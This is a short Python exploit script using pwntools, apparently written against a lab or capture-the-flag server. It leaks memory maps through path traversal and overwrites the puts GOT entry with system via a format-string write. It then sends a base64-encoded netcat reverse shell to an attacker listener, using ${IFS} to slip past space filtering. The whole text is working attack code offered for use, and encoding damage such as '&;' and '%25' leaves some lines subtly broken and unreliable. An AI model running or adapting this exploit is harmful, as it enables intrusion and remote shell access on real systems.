#!/usr/bin/env python
 
from pwn import *
 
debug = False
 
rhost = '10.10.10.148'
rport = 9999
lhost = '10.10.12.95'
lport = 7001
if (debug): rhost = '127.0.0.1'
 
# leak image and libc base
io = remote(rhost, rport)
io.send('GET ../../../../../proc/self/maps\r\nRange: bytes=0-10000\r\n\r\n')
maps = io.recvuntil('[stack]').split('\n')
img_base  = int(maps[6].split('-')[0], 16) # 7th line contains image base
libc_base = int(maps[12].split('-')[0], 16) # 13th line contains libc base
log.info('img_base : ' + hex(img_base))
log.info('libc_base: ' + hex(libc_base))
io.close()
 
# calculate addresses
puts_got = img_base + 0x5048 # live server
system   = libc_base + 0x3cd10 # live server
if (debug): system   = libc_base + 0x423d0 # local
log.info('puts_got : ' + hex(puts_got))
log.info('system   : ' + hex(system))
 
# craft format string
system_lword = system &; 0xffff
system_hword = system >> 16
fmt  = p32(puts_got)
fmt += p32(puts_got+2)
fmt += '%25'+str(system_lword-8)+'x'
fmt += '%2553$hn'
fmt += '%25'+str(system_hword-system_lword)+'x'
fmt += '%2554$hn'
io = remote(rhost, rport)
cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&;1|nc '+lhost+' '+str(lport)+' >/tmp/f'
payload = 'echo '+cmd.encode('base64').replace('\n','')+'|base64 -d|bash'
payload = payload.replace(' ', '${IFS}')
io.send(payload+' '+fmt+'\r\n\r\n')
io.close()
